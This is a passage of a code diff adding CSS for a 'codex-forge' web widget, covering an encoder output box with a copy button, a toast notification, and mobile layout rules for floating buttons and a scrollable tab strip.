+  .codex-forge__enc-in::placeholder {
+    color: var(--codex-text-dim, #6c7079);
+    opacity: 0.7;
+  }
+  /* Output row: relative parent for absolute copy button. The button is
+     vertically centered against the INITIAL (empty) output box height —
+     not against whatever current height the output has grown to. If the
+     output grows with multi-line content, the button stays anchored to
+     the visual center of the initial empty box. */
+  .codex-forge__enc-out-row {
+    position: relative;
+    margin-top: 0.3rem;
+  }
+  .codex-forge__enc-out {
+    /* Explicit pixel min-height so the button centering math is precise.
+       The button is 26px tall and we want it visually centered in this box. */
+    min-height: 42px;
+    /* Right padding clears the copy button (26px wide + 6px right inset + 4px gap = 36px = ~2.3rem). */
+    padding: 8px 36px 8px 10px;
+    background: var(--codex-bg, #0d0d0f);
+    border: 1px solid var(--codex-border, #2a2a2e);
+    border-radius: 2px;
+    color: var(--codex-accent-bright);
+    font-family: var(--codex-font-mono);
+    font-size: 0.72rem;
+    line-height: 1.45;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-x: auto;
+    box-sizing: border-box;
+  }
+
+  /* Toast */
+  .codex-forge__toast {
+    position: absolute;
+    bottom: 0.7rem;
+    left: 50%;
+    transform: translateX(-50%) translateY(8px);
+    padding: 0.35rem 0.8rem;
+    background: var(--codex-accent);
+    color: var(--codex-bg, #0d0d0f);
+    font-family: var(--codex-font-mono);
+    font-size: 0.7rem;
+    border-radius: 2px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.2s ease, transform 0.2s ease;
+    white-space: nowrap;
+  }
+  .codex-forge__toast--visible {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+
+  @media (max-width: 640px) {
+    /* Mobile: top position in the vertical stack of three floating
+       buttons. OperatorConsole is below at bottom:5rem; this Forge
+       button sits above with a 20px gap: 80 + 44 + 20 = 144px ≈ 9rem. */
+    .codex-forge {
+      right: 1rem;
+      bottom: 9rem;
+    }
+    .codex-forge__panel {
+      width: calc(100vw - 2rem);
+      right: 0;
+    }
+    /* Tab strip: 5 tabs at default 0.7rem padding overflow narrow phones.
+       Switch to horizontal scroll + tighter padding so all tabs are
+       reachable. The scrollbar is hidden visually but swipe still works. */
+    .codex-forge__tabs {
+      overflow-x: auto;
+      overflow-y: hidden;
+      scrollbar-width: none;          /* Firefox */
+      -ms-overflow-style: none;       /* Legacy Edge */
+    }
+    .codex-forge__tabs::-webkit-scrollbar {
+      display: none;                  /* Chrome / Safari */
+    }
+    .codex-forge__tab {
+      padding: 0.5rem 0.55rem;        /* tighter than desktop's 0.7rem */
+    }
+  }
+</style>
